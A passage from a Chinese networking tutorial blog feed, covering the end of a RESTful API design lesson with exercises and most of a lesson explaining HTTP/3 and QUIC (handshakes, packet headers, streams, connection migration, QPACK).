class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">RESTful API设计最佳实践：<br><br>1. 使用名词表示资源，用HTTP方法表示操作<br>   ✅ GET /users<br>   ❌ GET /getUsers<br><br>2. 使用复数形式<br>   ✅ /users, /products<br>   ❌ /user, /product<br><br>3. 使用正确的HTTP状态码<br>   200: 成功<br>   201: 创建成功<br>   204: 删除成功<br>   400: 请求错误<br>   401: 未认证<br>   403: 无权限<br>   404: 未找到<br>   500: 服务器错误<br><br>4. 提供版本控制<br>   /api/v1/users<br><br>5. 支持分页、过滤、排序<br>   ?page=1&amp;<span class="hljs-built_in">limit</span>=20&amp;<span class="hljs-built_in">sort</span>=name<br><br>6. 使用统一的响应格式<br>   &#123;<br>     <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>     <span class="hljs-string">&quot;data&quot;</span>: &#123;...&#125;<br>   &#125;<br><br>7. 提供清晰的错误信息<br>   &#123;<br>     <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>     <span class="hljs-string">&quot;error&quot;</span>: &#123;<br>       <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>       <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;详细错误信息&quot;</span><br>     &#125;<br>   &#125;<br><br>8. 使用HTTPS保护API<br>9. 实现认证和授权（JWT推荐）<br>10. 提供完善的API文档<br>11. 实现请求限流（Rate Limiting）<br>12. 使用缓存提高性能<br>13. 记录完整的日志<br>14. 编写完善的测试<br></code></pre></td></tr></table></figure><hr><h2 id="7-今日练习"><a href="#7-今日练习" class="headerlink" title="7. 今日练习"></a>7. 今日练习</h2><h3 id="练习1：设计博客API"><a href="#练习1：设计博客API" class="headerlink" title="练习1：设计博客API"></a>练习1：设计博客API</h3><p>设计一个博客系统的RESTful API，包含：</p><ul><li>文章（articles）</li><li>评论（comments）</li><li>标签（tags）</li></ul><p>要求：</p><ol><li>设计合理的URI</li><li>选择正确的HTTP方法</li><li>考虑资源之间的关系</li></ol><h3 id="练习2：实现产品API"><a href="#练习2：实现产品API" class="headerlink" title="练习2：实现产品API"></a>练习2：实现产品API</h3><p>扩展示例代码，实现产品管理API：</p><ul><li>产品CRUD操作</li><li>分类过滤</li><li>价格区间查询</li><li>库存管理</li></ul><h3 id="练习3：API测试"><a href="#练习3：API测试" class="headerlink" title="练习3：API测试"></a>练习3：API测试</h3><p>使用Postman或curl测试今天的用户管理API：</p><ol><li>测试所有端点</li><li>测试边界情况</li><li>测试错误处理</li></ol><hr><h2 id="8-扩展阅读"><a href="#8-扩展阅读" class="headerlink" title="8. 扩展阅读"></a>8. 扩展阅读</h2><ul><li>REST架构论文（Roy Fielding）</li><li>HTTP&#x2F;1.1规范（RFC 7231-7235）</li><li>JSON API规范</li><li>OpenAPI&#x2F;Swagger文档规范</li></ul><hr><p><strong>进度：30&#x2F;120天（25.0%）</strong></p><p>恭喜完成第30天学习！你已经掌握了RESTful API设计的核心原则。明天我们将学习WebSocket实时通信！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>29天：HTTP/3和QUIC协议</title>
    <link href="/2025/11/10/29%E5%A4%A9%EF%BC%9AHTTP_3%E5%92%8CQUIC%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/29%E5%A4%A9%EF%BC%9AHTTP_3%E5%92%8CQUIC%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="第29天：HTTP-3和QUIC协议"><a href="#第29天：HTTP-3和QUIC协议" class="headerlink" title="第29天：HTTP&#x2F;3和QUIC协议"></a>第29天：HTTP&#x2F;3和QUIC协议</h1><blockquote><p>“HTTP&#x2F;3就像给互联网装上了火箭引擎，更快、更稳、更可靠！”</p></blockquote><h2 id="📚-今日目标"><a href="#📚-今日目标" class="headerlink" title="📚 今日目标"></a>📚 今日目标</h2><ul><li>理解HTTP&#x2F;2的遗留问题</li><li>掌握QUIC协议的核心特性</li><li>学习HTTP&#x2F;3的改进</li><li>理解0-RTT连接建立</li><li>了解UDP在传输层的应用</li></ul><hr><h2 id="1-为什么需要HTTP-3？"><a href="#1-为什么需要HTTP-3？" class="headerlink" title="1. 为什么需要HTTP&#x2F;3？"></a>1. 为什么需要HTTP&#x2F;3？</h2><h3 id="1-1-HTTP-2的问题"><a href="#1-1-HTTP-2的问题" class="headerlink" title="1.1 HTTP&#x2F;2的问题"></a>1.1 HTTP&#x2F;2的问题</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs inform7">HTTP/2虽然解决了应用层的队头阻塞，<br>但在传输层仍然存在问题：<br><br>TCP层队头阻塞：<br>┌───────────────────────────────────────────┐<br>│  HTTP/2连接（基于TCP）                     │<br>│  ├─ 流1: <span class="hljs-comment">[包1]</span><span class="hljs-comment">[包2]</span><span class="hljs-comment">[包3]</span>                   │<br>│  ├─ 流2: <span class="hljs-comment">[包1]</span><span class="hljs-comment">[包2]</span><span class="hljs-comment">[包3]</span>                   │<br>│  └─ 流3: <span class="hljs-comment">[包1]</span><span class="hljs-comment">[包2]</span><span class="hljs-comment">[包3]</span>                   │<br>└───────────────────────────────────────────┘<br>         ↓<br>    TCP传输层<br>         ↓<br>┌───────────────────────────────────────────┐<br>│  如果流1的包2丢失：                        │<br>│  ├─ 流1: <span class="hljs-comment">[包1]</span> <span class="hljs-comment">[X]</span> <span class="hljs-comment">[等待]</span>                 │<br>│  ├─ 流2: <span class="hljs-comment">[包1]</span> <span class="hljs-comment">[包2]</span> <span class="hljs-comment">[等待]</span> ← 被阻塞！    │<br>│  └─ 流3: <span class="hljs-comment">[包1]</span> <span class="hljs-comment">[包2]</span> <span class="hljs-comment">[等待]</span> ← 被阻塞！    │<br>└───────────────────────────────────────────┘<br><br>问题：<br>TCP要求按序交付，一个包丢失会阻塞所有后续包<br>即使其他流的数据已经到达，也必须等待<br><br>生活化类比：<br>TCP = 单轨火车<br>┌─────────────────────────────┐<br>│ <span class="hljs-comment">[车厢1]</span><span class="hljs-comment">[车厢2]</span><span class="hljs-comment">[X]</span><span class="hljs-comment">[车厢4]</span>... │<br>└─────────────────────────────┘<br>车厢3脱轨 → 后面所有车厢都要等待<br><br>QUIC = 多轨道独立列车<br>┌─────────────────────────────┐<br>│ 轨道1: <span class="hljs-comment">[车厢1]</span><span class="hljs-comment">[车厢2]</span><span class="hljs-comment">[车厢3]</span>│<br>│ 轨道2: <span class="hljs-comment">[车厢1]</span><span class="hljs-comment">[X]</span><span class="hljs-comment">[等待]</span>     │ ← 只影响轨道2<br>│ 轨道3: <span class="hljs-comment">[车厢1]</span><span class="hljs-comment">[车厢2]</span><span class="hljs-comment">[车厢3]</span>│<br>└─────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="1-2-其他问题"><a href="#1-2-其他问题" class="headerlink" title="1.2 其他问题"></a>1.2 其他问题</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP/2的其他限制：<br><br><span class="hljs-bullet">1.</span> 连接建立慢<br>   TCP握手：1-RTT<br>   TLS握手：1-2 RTT<br>   总计：2-3 RTT才能发送数据<br><br>   示例（首次连接）：<br>   客户端 → SYN                     → 服务器<br>   客户端 ← SYN-ACK                 ← 服务器  (1-RTT)<br>   客户端 → ACK                     → 服务器<br><br>   客户端 → Client Hello            → 服务器<br>   客户端 ← Server Hello, 证书等     ← 服务器  (2-RTT)<br>   客户端 → Client Finished         → 服务器<br><br>   客户端 → HTTP请求                → 服务器  (3-RTT)<br><br>   总延迟：3-RTT<br><br><span class="hljs-bullet">2.</span> 连接迁移困难<br><span class="hljs-bullet">   -</span> TCP连接由四元组标识（源IP、源端口、目标IP、目标端口）<br><span class="hljs-bullet">   -</span> WiFi切换到4G，IP变化 → 连接断开 → 需要重新建立<br><br><span class="hljs-bullet">3.</span> 握手冗余<br><span class="hljs-bullet">   -</span> TCP和TLS分别握手<br><span class="hljs-bullet">   -</span> 数据重复（如随机数）<br></code></pre></td></tr></table></figure><hr><h2 id="2-QUIC协议详解"><a href="#2-QUIC协议详解" class="headerlink" title="2. QUIC协议详解"></a>2. QUIC协议详解</h2><h3 id="2-1-QUIC概述"><a href="#2-1-QUIC概述" class="headerlink" title="2.1 QUIC概述"></a>2.1 QUIC概述</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">QUIC (Quick UDP Internet Connections)<br><br>核心特点：<br>┌────────────────────────────────────────┐<br>│  QUIC = UDP + 可靠性 + 加密 + 多路复用  │<br>└────────────────────────────────────────┘<br><br>协议栈对比：<br><br><span class="hljs-section">HTTP/2:</span><br><span class="hljs-section">应用层:  HTTP/2</span><br><span class="hljs-section">传输层:  TCP</span><br><span class="hljs-section">安全层:  TLS 1.2/1.3</span><br><span class="hljs-section">网络层:  IP</span><br><br><span class="hljs-section">HTTP/3:</span><br><span class="hljs-section">应用层:  HTTP/3</span><br><span class="hljs-section">传输层:  QUIC (包含加密、可靠性)</span><br><span class="hljs-section">网络层:  UDP + IP</span><br><br>优势：<br>✅ 0-RTT或1-RTT连接建立<br>✅ 无队头阻塞<br>✅ 连接迁移<br>✅ 改进的拥塞控制<br>✅ 前向纠错（FEC）<br></code></pre></td></tr></table></figure><h3 id="2-2-QUIC连接建立"><a href="#2-2-QUIC连接建立" class="headerlink" title="2.2 QUIC连接建立"></a>2.2 QUIC连接建立</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">QUIC握手流程（1-RTT）：</span><br><br><span class="hljs-string">首次连接：</span><br><span class="hljs-string">客户端</span> <span class="hljs-string">→</span> <span class="hljs-string">Initial</span> <span class="hljs-string">Packet</span>                    <span class="hljs-string">→</span> <span class="hljs-string">服务器</span><br>         <span class="hljs-string">(Client</span> <span class="hljs-string">Hello</span> <span class="hljs-string">+</span> <span class="hljs-string">QUIC参数)</span><br><span class="hljs-string">客户端</span> <span class="hljs-string">←</span> <span class="hljs-string">Handshake</span> <span class="hljs-string">Packet</span>                  <span class="hljs-string">←</span> <span class="hljs-string">服务器</span>  <span class="hljs-string">(1-RTT)</span><br>         <span class="hljs-string">(Server</span> <span class="hljs-string">Hello</span> <span class="hljs-string">+</span> <span class="hljs-string">证书</span> <span class="hljs-string">+</span> <span class="hljs-string">Finished)</span><br><span class="hljs-string">客户端</span> <span class="hljs-string">→</span> <span class="hljs-string">Handshake</span> <span class="hljs-string">Packet</span> <span class="hljs-string">+</span> <span class="hljs-string">Application</span> <span class="hljs-string">Data</span> <span class="hljs-string">→</span> <span class="hljs-string">服务器</span><br>         <span class="hljs-string">(Finished</span> <span class="hljs-string">+</span> <span class="hljs-string">HTTP请求)</span><br><br><span class="hljs-string">总延迟：1-RTT即可发送数据！</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">再次连接（0-RTT）：</span><br><span class="hljs-string">客户端保存了服务器的配置和密钥</span><br><span class="hljs-string">客户端</span> <span class="hljs-string">→</span> <span class="hljs-string">Initial</span> <span class="hljs-string">Packet</span> <span class="hljs-string">+</span> <span class="hljs-string">Application</span> <span class="hljs-string">Data</span> <span class="hljs-string">→</span> <span class="hljs-string">服务器</span><br>         <span class="hljs-string">(之前的密钥</span> <span class="hljs-string">+</span> <span class="hljs-string">HTTP请求)</span><br><br><span class="hljs-string">总延迟：0-RTT！数据立即发送！</span><br><br><span class="hljs-string">对比：</span><br><span class="hljs-string">HTTP/2</span> <span class="hljs-string">首次连接:</span> <span class="hljs-number">3</span><span class="hljs-string">-RTT</span><br><span class="hljs-string">HTTP/3</span> <span class="hljs-string">首次连接:</span> <span class="hljs-number">1</span><span class="hljs-string">-RTT</span>  <span class="hljs-string">✅</span> <span class="hljs-string">快2倍</span><br><br><span class="hljs-string">HTTP/2</span> <span class="hljs-string">再次连接:</span> <span class="hljs-number">2</span><span class="hljs-string">-RTT</span> <span class="hljs-string">(TLS会话恢复)</span><br><span class="hljs-string">HTTP/3</span> <span class="hljs-string">再次连接:</span> <span class="hljs-number">0</span><span class="hljs-string">-RTT</span>  <span class="hljs-string">✅</span> <span class="hljs-string">无延迟</span><br></code></pre></td></tr></table></figure><h3 id="2-3-QUIC数据包结构"><a href="#2-3-QUIC数据包结构" class="headerlink" title="2.3 QUIC数据包结构"></a>2.3 QUIC数据包结构</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">QUIC数据包格式：<br><br>长头部格式（Long <span class="hljs-keyword">Header</span>）：<br>┌──────────────────────────────────────────┐<br>│ <span class="hljs-keyword">Header</span> Form (<span class="hljs-number">1</span>) = <span class="hljs-number">1</span>                      │<br>│ Fixed <span class="hljs-type">Bit</span> (<span class="hljs-number">1</span>) = <span class="hljs-number">1</span>                        │<br>│ Long Packet <span class="hljs-keyword">Type</span> (<span class="hljs-number">2</span>)                     │<br>│ <span class="hljs-keyword">Type</span>-Specific Bits (<span class="hljs-number">4</span>)                   │<br>├──────────────────────────────────────────┤<br>│ Version (<span class="hljs-number">32</span>)                             │<br>├──────────────────────────────────────────┤<br>│ Destination <span class="hljs-keyword">Connection</span> ID Length (<span class="hljs-number">8</span>)     │<br>│ Destination <span class="hljs-keyword">Connection</span> ID (<span class="hljs-number">0.</span><span class="hljs-number">.160</span>)       │<br>├──────────────────────────────────────────┤<br>│ Source <span class="hljs-keyword">Connection</span> ID Length (<span class="hljs-number">8</span>)          │<br>│ Source <span class="hljs-keyword">Connection</span> ID (<span class="hljs-number">0.</span><span class="hljs-number">.160</span>)            │<br>├──────────────────────────────────────────┤<br>│ <span class="hljs-keyword">Type</span>-Specific Payload                    │<br>└──────────────────────────────────────────┘<br><br>短头部格式（Short <span class="hljs-keyword">Header</span>）：<br>┌──────────────────────────────────────────┐<br>│ <span class="hljs-keyword">Header</span> Form (<span class="hljs-number">1</span>) = <span class="hljs-number">0</span>                      │<br>│ Fixed <span class="hljs-type">Bit</span> (<span class="hljs-number">1</span>) = <span class="hljs-number">1</span>                        │<br>│ Spin <span class="hljs-type">Bit</span> (<span class="hljs-number">1</span>)                             │<br>│ Reserved Bits (<span class="hljs-number">2</span>)                        │<br>│ Key Phase (<span class="hljs-number">1</span>)                            │<br>│ Packet Number Length (<span class="hljs-number">2</span>)                 │<br>├──────────────────────────────────────────┤<br>│ Destination <span class="hljs-keyword">Connection</span> ID (<span class="hljs-number">0.</span><span class="hljs-number">.160</span>)       │<br>├──────────────────────────────────────────┤<br>│ Packet Number (<span class="hljs-number">8.</span><span class="hljs-number">.32</span>)                    │<br>├──────────────────────────────────────────┤<br>│ Protected Payload                        │<br>└──────────────────────────────────────────┘<br><br>关键字段：<br>- <span class="hljs-keyword">Connection</span> ID: 连接标识符（不是IP+端口）<br>- Packet Number: 包序号（用于确认和重传）<br>- Protected Payload: 加密的负载<br></code></pre></td></tr></table></figure><h3 id="2-4-QUIC流（Stream）"><a href="#2-4-QUIC流（Stream）" class="headerlink" title="2.4 QUIC流（Stream）"></a>2.4 QUIC流（Stream）</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">QUIC</span>流的特点：<br><br><span class="hljs-number">1.</span> 独立的流<br>   每个流有独立的序号空间<br>   一个流的丢包不影响其他流<br><br>示例：<br>┌─────────────────────────────────────────┐<br>│  <span class="hljs-symbol">QUIC</span>连接                                │<br>│  ├─ 流<span class="hljs-number">0</span>: [包<span class="hljs-number">0</span>][包<span class="hljs-number">1</span>][包<span class="hljs-number">2</span>] ✅ 完成        │<br>│  ├─ 流<span class="hljs-number">4</span>: [包<span class="hljs-number">0</span>][<span class="hljs-symbol">X</span>][等待]  ⏸️ 只影响流<span class="hljs-number">4</span>  │<br>│  ├─ 流<span class="hljs-number">8</span>: [包<span class="hljs-number">0</span>][包<span class="hljs-number">1</span>][包<span class="hljs-number">2</span>] ✅ 完成        │<br>│  └─ 流<span class="hljs-number">12</span>:[包<span class="hljs-number">0</span>][包<span class="hljs-number">1</span>]      ✅ 继续传输    │<br>└─────────────────────────────────────────┘<br><br><span class="hljs-number">2.</span> 流的类型<br>   - 单向流：只能单向发送数据<br>   - 双向流：可以双向发送数据<br><br><span class="hljs-number">3.</span> 流的<span class="hljs-symbol">ID</span><br>   - 客户端发起的双向流：<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12.</span>..<br>   - 服务器发起的双向流：<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13.</span>..<br>   - 客户端发起的单向流：<span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14.</span>..<br>   - 服务器发起的单向流：<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15.</span>..<br></code></pre></td></tr></table></figure><h3 id="2-5-连接迁移"><a href="#2-5-连接迁移" class="headerlink" title="2.5 连接迁移"></a>2.5 连接迁移</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QUIC连接迁移：<br><br>传统TCP：<br>WiFi:   192.168.1.100:5000 ←→ Server:443<br><span class="hljs-code">        ↓ (WiFi → 4G)</span><br><span class="hljs-code">4G:     10.0.0.50:5000     ←→ Server:443</span><br><span class="hljs-code">        ❌ IP变化，连接断开，需要重新建立</span><br><span class="hljs-code"></span><br>QUIC：<br>WiFi:   192.168.1.100:5000 ←→ Server:443<br><span class="hljs-code">        Connection ID: abc123</span><br><span class="hljs-code">        ↓ (WiFi → 4G)</span><br><span class="hljs-code">4G:     10.0.0.50:5000     ←→ Server:443</span><br><span class="hljs-code">        Connection ID: abc123  ✅ 仍然是同一个连接！</span><br><span class="hljs-code"></span><br>原理：<br><span class="hljs-bullet">-</span> QUIC使用Connection ID标识连接<br><span class="hljs-bullet">-</span> Connection ID不依赖于IP地址和端口<br><span class="hljs-bullet">-</span> 网络切换时，只需要发送新的包<br><span class="hljs-bullet">-</span> 服务器识别Connection ID，继续原连接<br><br>迁移过程：<br><span class="hljs-bullet">1.</span> 客户端检测到IP变化<br><span class="hljs-bullet">2.</span> 使用新IP发送带有相同Connection ID的包<br><span class="hljs-bullet">3.</span> 服务器验证Connection ID<br><span class="hljs-bullet">4.</span> 更新路径信息，继续通信<br><span class="hljs-bullet">5.</span> 无需重新握手！<br><br>应用场景：<br><span class="hljs-bullet">-</span> 手机WiFi切换到4G<br><span class="hljs-bullet">-</span> 笔记本从家里移动到咖啡店<br><span class="hljs-bullet">-</span> 负载均衡器切换<br></code></pre></td></tr></table></figure><hr><h2 id="3-HTTP-3详解"><a href="#3-HTTP-3详解" class="headerlink" title="3. HTTP&#x2F;3详解"></a>3. HTTP&#x2F;3详解</h2><h3 id="3-1-HTTP-3架构"><a href="#3-1-HTTP-3架构" class="headerlink" title="3.1 HTTP&#x2F;3架构"></a>3.1 HTTP&#x2F;3架构</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nix">HTTP<span class="hljs-symbol">/3</span> <span class="hljs-operator">=</span> HTTP<span class="hljs-operator">/</span><span class="hljs-number">2</span>语义 <span class="hljs-operator">+</span> QUIC传输<br><br>协议映射：<br>┌─────────────────────────────────────────┐<br>│  HTTP<span class="hljs-symbol">/3</span>                                 │<br>│  <span class="hljs-operator">-</span> 请求<span class="hljs-operator">/</span>响应模型                         │<br>│  <span class="hljs-operator">-</span> 头部压缩（QPACK）                     │<br>│  <span class="hljs-operator">-</span> 服务器推送                            │<br>└─────────────────────────────────────────┘<br>              ↓<br>┌─────────────────────────────────────────┐<br>│  QUIC                                   │<br>│  <span class="hljs-operator">-</span> 流（Streams）                         │<br>│  <span class="hljs-operator">-</span> 连接管理                              │<br>│  <span class="hljs-operator">-</span> 可靠传输                              │<br>│  <span class="hljs-operator">-</span> 加密（TLS <span class="hljs-number">1.3</span>）                       │<br>└─────────────────────────────────────────┘<br>              ↓<br>┌─────────────────────────────────────────┐<br>│  UDP                                    │<br>└─────────────────────────────────────────┘<br><br>帧类型（HTTP<span class="hljs-operator">/</span><span class="hljs-number">3</span>特有）：<br><span class="hljs-operator">-</span> <span class="hljs-params">DATA:</span> 传输HTTP消息体<br><span class="hljs-operator">-</span> <span class="hljs-params">HEADERS:</span> 传输HTTP头部（QPACK压缩）<br><span class="hljs-operator">-</span> <span class="hljs-params">SETTINGS:</span> 设置参数<br><span class="hljs-operator">-</span> <span class="hljs-params">PUSH_PROMISE:</span> 服务器推送<br><span class="hljs-operator">-</span> <span class="hljs-params">GOAWAY:</span> 关闭连接<br><span class="hljs-operator">-</span> <span class="hljs-params">MAX_PUSH_ID:</span> 限制推送ID<br><span class="hljs-operator">-</span> <span class="hljs-params">CANCEL_PUSH:</span> 取消推送<br></code></pre></td></tr></table></figure><h3 id="3-2-QPACK头部压缩"><a href="#3-2-QPACK头部压缩" class="headerlink" title="3.2 QPACK头部压缩"></a>3.2 QPACK头部压缩</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QPACK vs HPACK：<br><br>HPACK（HTTP/2）问题：<br><span class="hljs-bullet">-</span> 动态表需要按序更新<br><span class="hljs-bullet">-</span> 一个流的头部阻塞会影响其他流<br><br>QPACK改进：<br><span class="hljs-bullet">-</span> 允许乱序更新动态表<br><span class="hljs-bullet">-</span> 使用专用的编码流和解码流<br><span class="hljs-bullet">-</span> 避免队头阻塞<br><br>QPACK架构：<br>┌─────────────────────────────────────────┐<br>│  编码器流（Encoder Stream）              │<br>│  - 发送动态表更新                        │<br>└─────────────────────────────────────────┘<br><span class="hljs-code">              ↓</span><br><span class="hljs-code">┌─────────────────────────────────────────┐</span><br><span class="hljs-code">│  请求流（Request Streams）               │</span><br><span class="hljs-code">│  - 引用动态表                            │</span><br><span class="hljs-code">│  - 发送压缩的头部                        │</span><br><span class="hljs-code">└─────────────────────────────────────────┘</span><br><span class="hljs-code">              ↓</span><br><span class="hljs-code">┌─────────────────────────────────────────┐</span><br><span class="hljs-code">│  解码器流（Decoder Stream）              │</span><br><span class="hljs-code">│  - 确认动态表更新                        │</span><br><span class="hljs-code">└─────────────────────────────────────────┘</span><br><span class="hljs-code"></span><br>工作流程：<br><span class="hljs-bullet">1.</span> 编码器发送动态表插入指令<br><span class="hljs-bullet">2.</span> 请求流引用动态表条目<br><span class="hljs-bullet">3.</span> 解码器确认收到插入指令<br><span class="hljs-bullet">4.</span> 编码器可以安全地驱逐旧条目<br></code></pre></td></tr></table></figure><h3 